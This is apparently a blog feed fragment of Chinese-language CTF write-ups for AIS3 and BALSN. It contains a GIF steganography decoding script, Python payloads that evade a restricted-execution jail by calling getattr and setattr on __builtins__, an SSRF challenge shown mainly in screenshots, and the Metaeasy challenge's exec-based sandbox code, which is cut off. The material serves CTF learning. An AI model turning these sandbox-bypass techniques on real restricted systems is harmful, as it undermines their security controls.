+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/168673443-93e61a32-9206-430b-8c06-e29a62838e1e.png" alt="image">&lt;/p>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/168673507-f4504ec0-9a13-4b9b-8d45-99ccc72b137f.png" alt="image">&lt;/p>
+&lt;h4 id="flag-1">Flag&lt;/h4>
+&lt;p>&lt;code>AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}&lt;/code>&lt;/p>
+&lt;h3 id="gift-in-the-dream">Gift in the dream&lt;/h3>
+&lt;h4 id="題目-2">題目&lt;/h4>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/168673698-16d3c232-db1c-4d69-a3c0-9970b5503f32.png" alt="image">&lt;/p>
+&lt;h4 id="解題-1">解題&lt;/h4>
+&lt;p>&lt;code>binwalk gift_in_the_dream.gif&lt;/code> 一下發現啥都沒有。
+&lt;img src="https://user-images.githubusercontent.com/57281249/168673798-46ea4b75-0057-40ed-84a7-8b8960af17c5.png" alt="image">&lt;/p>
+&lt;p>&lt;code>strings gift_in_the_dream.gif&lt;/code> 一下看到一堆重複出現的奇怪字串，應該是提示。
+&lt;img src="https://user-images.githubusercontent.com/57281249/168673891-c278d846-63a4-4d04-9323-9f5107eaaf25.png" alt="image">&lt;/p>
+&lt;p>通靈一下發現應該要用 identify 把每個幀數間的間距時間抓出來應該就是 flag 了。
+&lt;img src="https://user-images.githubusercontent.com/57281249/168673950-126f0c6a-39d7-46ad-ac6d-00dc62b475fd.png" alt="image">&lt;/p>
+&lt;h4 id="script">Script&lt;/h4>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> a in &lt;span style="color:#66d9ef">$(&lt;/span>identify -format &lt;span style="color:#e6db74">&amp;#34;%s %T \n&amp;#34;&lt;/span> gift_in_the_dream.gif | awk &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf &lt;span style="color:#e6db74">&amp;#34;%02X&amp;#34;&lt;/span> $a | xxd -r -p
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">done&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/168674150-9425fae5-e7af-4ab2-8de2-65af515d8752.png" alt="image">&lt;/p></description></item><item><title>AIS3 EOF 2021 Writeup</title><link>https://blog.chummydns.com/blogs/ais3-eof-2021-writeup/</link><pubDate>Sun, 16 Jan 2022 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-eof-2021-writeup/</guid><description>&lt;h2 id="leetcall">leetcall&lt;/h2>
+&lt;h3 id="題目">題目&lt;/h3>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/149655714-e6376ea0-d898-4f29-9de4-d3036977f841.png" alt="image">&lt;/p>
+&lt;h3 id="限制">限制&lt;/h3>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/149655738-eba68a84-87fb-4f74-9869-4241f4084258.png" alt="image">&lt;/p>
+&lt;h3 id="payload">payload&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Problem 1: Hello&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(getattr(&lt;span style="color:#e6db74">&amp;#34;Hello, &lt;/span>&lt;span style="color:#e6db74">{:}&lt;/span>&lt;span style="color:#e6db74">!&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;format&amp;#39;&lt;/span>)(getattr(&lt;span style="color:#e6db74">&amp;#39;!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">Hello, &amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;join&amp;#39;&lt;/span>)(getattr(getattr(open(&lt;span style="color:#ae81ff">0&lt;/span>),&lt;span style="color:#e6db74">&amp;#39;read&amp;#39;&lt;/span>)(),&lt;span style="color:#e6db74">&amp;#39;splitlines&amp;#39;&lt;/span>)())))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Problem 2: Fibonacci&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(getattr(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;join&amp;#39;&lt;/span>)(map(str,map(round,map(getattr(&lt;span style="color:#ae81ff">0.4472135954999579&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;__mul__&amp;#39;&lt;/span>),map(getattr(&lt;span style="color:#ae81ff">1.618033988749895&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;__pow__&amp;#39;&lt;/span>),map(int,getattr(open(&lt;span style="color:#ae81ff">0&lt;/span>),&lt;span style="color:#e6db74">&amp;#39;readlines&amp;#39;&lt;/span>)())))))))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Problem 3: FizzBuzz&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>getattr(&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;format&amp;#39;&lt;/span>)(setattr(__builtins__,&lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span>,range(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">10001&lt;/span>)),setattr(__builtins__,&lt;span style="color:#e6db74">&amp;#39;b&amp;#39;&lt;/span>,list(map(bool,map(getattr(&lt;span style="color:#ae81ff">3&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;__rmod__&amp;#39;&lt;/span>),a)))),setattr(__builtins__,&lt;span style="color:#e6db74">&amp;#39;c&amp;#39;&lt;/span>,list(map(bool,map(getattr(&lt;span style="color:#ae81ff">5&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;__rmod__&amp;#39;&lt;/span>),a)))),print(getattr(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;join&amp;#39;&lt;/span>)(map(getattr(str,&lt;span style="color:#e6db74">&amp;#39;__add__&amp;#39;&lt;/span>),map(getattr(str,&lt;span style="color:#e6db74">&amp;#39;__add__&amp;#39;&lt;/span>),map(getattr(str,&lt;span style="color:#e6db74">&amp;#39;__mul__&amp;#39;&lt;/span>),map(str,a),map(getattr(bool,&lt;span style="color:#e6db74">&amp;#39;__and__&amp;#39;&lt;/span>),b,c)),map(getattr(&lt;span style="color:#e6db74">&amp;#39;Fizz&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;__mul__&amp;#39;&lt;/span>),map(getattr(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;__eq__&amp;#39;&lt;/span>),b))),map(getattr(&lt;span style="color:#e6db74">&amp;#39;Buzz&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;__mul__&amp;#39;&lt;/span>),map(getattr(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;__eq__&amp;#39;&lt;/span>),c))))))
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/149656065-11129a7b-6f05-44c2-b292-965b80a5de0b.png" alt="image">&lt;/p>
+&lt;h3 id="flag">flag&lt;/h3>
+&lt;p>FLAG{actually_you_can_also_solve_those_leetcode_challenges_in_this_way:D}&lt;/p>
+&lt;h2 id="ssrf-challenge-or-not">SSRF Challenge or Not?&lt;/h2>
+&lt;h3 id="題目-1">題目&lt;/h3>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/149656247-59579593-98b6-4874-b6bf-14d99f59242f.png" alt="image">&lt;/p>
+&lt;h3 id="網址">網址&lt;/h3>
+&lt;p>&lt;a href="https://ssrf.h4ck3r.quest/">https://ssrf.h4ck3r.quest/&lt;/a>&lt;/p>
+&lt;h3 id="解題">解題&lt;/h3>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/149656280-316252b6-c18f-4c9b-8319-541ebd1c23ce.png" alt="image">
+&lt;img src="https://user-images.githubusercontent.com/57281249/149656292-74ee449f-133e-4779-b74a-4810ac094811.png" alt="image">
+&lt;img src="https://user-images.githubusercontent.com/57281249/149656304-9e10382a-c94d-4af7-9f22-b9c08f7e894f.png" alt="image">
+&lt;img src="https://user-images.githubusercontent.com/57281249/149656319-995c05b0-df12-4e72-af3a-3f9a1bff4ec0.png" alt="image">
+&lt;img src="https://user-images.githubusercontent.com/57281249/149656323-ce056c33-43cb-49a2-ba7b-4d54fcfa6dbf.png" alt="image">
+&lt;img src="https://user-images.githubusercontent.com/57281249/149656358-cf01ee72-ca11-4ae9-9cce-ece7979edab4.png" alt="image">
+&lt;img src="https://user-images.githubusercontent.com/57281249/149656376-68d2fddc-2a70-41bb-a1f5-c6825d99d01e.png" alt="image">
+&lt;img src="https://user-images.githubusercontent.com/57281249/149656409-8eabc8d6-9889-4969-94c2-3ea239b927a4.png" alt="image">
+&lt;img src="https://user-images.githubusercontent.com/57281249/149656426-74cee109-ad40-4327-a4c7-ac389ce672ca.png" alt="image">
+&lt;img src="https://user-images.githubusercontent.com/57281249/149656443-7e0201fb-8bf0-44f0-976d-a54b74958bee.png" alt="image">
+&lt;img src="https://user-images.githubusercontent.com/57281249/149656461-15492549-47f7-418e-85a0-657c08f664d7.png" alt="image">&lt;/p>
+&lt;h3 id="flag-1">flag&lt;/h3>
+&lt;p>FLAG{well, maybe not? XD}&lt;/p></description></item><item><title>BALSN 2021 WriteUp</title><link>https://blog.chummydns.com/blogs/balsn-2021-writeup/</link><pubDate>Mon, 22 Nov 2021 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/balsn-2021-writeup/</guid><description>&lt;h1 id="balsn-2021-writeup">balsn-2021-writeup&lt;/h1>
+&lt;h2 id="戰績">戰績&lt;/h2>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/142795491-ff0795d1-44bb-493d-bd42-6d7af82e53f4.png" alt="image">&lt;/p>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/142795573-629c32d0-909f-4ef2-9316-cd585f376883.png" alt="image">&lt;/p>
+&lt;h2 id="metaeasy">Metaeasy&lt;/h2>
+&lt;h3 id="題目">題目&lt;/h3>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/142795079-081b6121-de1a-42a8-b090-c859da245b43.png" alt="image">&lt;/p>
+&lt;h3 id="server-code">server code&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python3" data-lang="python3">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MasterMetaClass&lt;/span>(type): 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __new__(cls, class_name, class_parents, class_attr):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getFlag&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;Here you go, my master&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;flag&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(f&lt;span style="color:#f92672">.&lt;/span>read())
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> class_attr[getFlag&lt;span style="color:#f92672">.&lt;/span>__name__] &lt;span style="color:#f92672">=&lt;/span> getFlag
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> attrs &lt;span style="color:#f92672">=&lt;/span> ((name, value) &lt;span style="color:#66d9ef">for&lt;/span> name, value &lt;span style="color:#f92672">in&lt;/span> class_attr&lt;span style="color:#f92672">.&lt;/span>items() &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> name&lt;span style="color:#f92672">.&lt;/span>startswith(&lt;span style="color:#e6db74">&amp;#39;__&amp;#39;&lt;/span>))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> class_attr &lt;span style="color:#f92672">=&lt;/span> dict((&lt;span style="color:#e6db74">&amp;#39;IWant&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>name&lt;span style="color:#f92672">.&lt;/span>upper()&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Plz&amp;#39;&lt;/span>, value) &lt;span style="color:#66d9ef">for&lt;/span> name, value &lt;span style="color:#f92672">in&lt;/span> attrs)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> newclass &lt;span style="color:#f92672">=&lt;/span> super()&lt;span style="color:#f92672">.&lt;/span>__new__(cls, class_name, class_parents, class_attr)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> newclass
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(&lt;span style="color:#f92672">*&lt;/span>argv):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;Bad guy! No Flag !!&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Illegal&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">BalsnMetaClass&lt;/span>(type):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getFlag&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;You&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">re not Master! No Flag !!&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __new__(cls, class_name, class_parents, class_attr):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> newclass &lt;span style="color:#f92672">=&lt;/span> super()&lt;span style="color:#f92672">.&lt;/span>__new__(cls, class_name, class_parents, class_attr)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> setattr(newclass, cls&lt;span style="color:#f92672">.&lt;/span>getFlag&lt;span style="color:#f92672">.&lt;/span>__name__, cls&lt;span style="color:#f92672">.&lt;/span>getFlag)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> newclass
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">secure_vars&lt;/span>(s):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> attrs &lt;span style="color:#f92672">=&lt;/span> {name:value &lt;span style="color:#66d9ef">for&lt;/span> name, value &lt;span style="color:#f92672">in&lt;/span> vars(s)&lt;span style="color:#f92672">.&lt;/span>items() &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> name&lt;span style="color:#f92672">.&lt;/span>startswith(&lt;span style="color:#e6db74">&amp;#39;__&amp;#39;&lt;/span>)}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> attrs
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>safe_dict &lt;span style="color:#f92672">=&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;BalsnMetaClass&amp;#39;&lt;/span> : BalsnMetaClass,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;MasterMetaClass&amp;#39;&lt;/span> : MasterMetaClass,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;False&amp;#39;&lt;/span> : &lt;span style="color:#66d9ef">False&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;True&amp;#39;&lt;/span> : &lt;span style="color:#66d9ef">True&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;abs&amp;#39;&lt;/span> : abs,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;all&amp;#39;&lt;/span> : all,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;any&amp;#39;&lt;/span> : any,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;ascii&amp;#39;&lt;/span> : ascii,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;bin&amp;#39;&lt;/span> : bin,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;bool&amp;#39;&lt;/span> : bool,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;bytearray&amp;#39;&lt;/span> : bytearray,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;bytes&amp;#39;&lt;/span> : bytes,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;chr&amp;#39;&lt;/span> : chr,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;complex&amp;#39;&lt;/span> : complex,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;dict&amp;#39;&lt;/span> : dict,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;dir&amp;#39;&lt;/span> : dir,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;divmod&amp;#39;&lt;/span> : divmod,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;enumerate&amp;#39;&lt;/span> : enumerate,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;filter&amp;#39;&lt;/span> : filter,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;float&amp;#39;&lt;/span> : float,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;format&amp;#39;&lt;/span> : format,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;hash&amp;#39;&lt;/span> : hash,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;help&amp;#39;&lt;/span> : help,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span> : hex,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;id&amp;#39;&lt;/span> : id,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;int&amp;#39;&lt;/span> : int,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;iter&amp;#39;&lt;/span> : iter,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;len&amp;#39;&lt;/span> : len,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;list&amp;#39;&lt;/span> : list,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;map&amp;#39;&lt;/span> : map,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;max&amp;#39;&lt;/span> : max,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;min&amp;#39;&lt;/span> : min,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;next&amp;#39;&lt;/span> : next,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;oct&amp;#39;&lt;/span> : oct,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;ord&amp;#39;&lt;/span> : ord,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;pow&amp;#39;&lt;/span> : pow,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;print&amp;#39;&lt;/span> : print,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;range&amp;#39;&lt;/span> : range,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;reversed&amp;#39;&lt;/span> : reversed,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;round&amp;#39;&lt;/span> : round,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;set&amp;#39;&lt;/span> : set,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;slice&amp;#39;&lt;/span> : slice,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;sorted&amp;#39;&lt;/span> : sorted,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;str&amp;#39;&lt;/span> : str,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;sum&amp;#39;&lt;/span> : sum,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;tuple&amp;#39;&lt;/span> : tuple,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span> : type,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;vars&amp;#39;&lt;/span> : secure_vars,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;zip&amp;#39;&lt;/span> : zip,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;__builtins__&amp;#39;&lt;/span>:&lt;span style="color:#66d9ef">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">createMethod&lt;/span>(code):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(code) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">45&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;Too long!! Bad Guy!!&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#e6db74">&amp;#39; _$#@~&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#f92672">=&lt;/span> code&lt;span style="color:#f92672">.&lt;/span>replace(x,&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">wrapper&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exec(code, safe_dict, {&lt;span style="color:#e6db74">&amp;#39;self&amp;#39;&lt;/span> : self})
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> wrapper
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">setName&lt;/span>(pattern):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Give me your &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>pattern&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> name :&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (name&lt;span style="color:#f92672">.&lt;/span>isalpha()):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#39;Illegal Name...&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> name
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">setAttribute&lt;/span>(cls):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> attrName &lt;span style="color:#f92672">=&lt;/span> setName(&lt;span style="color:#e6db74">&amp;#39;attribute&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> attrValue &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Give me your value:&amp;#39;&lt;/span>)
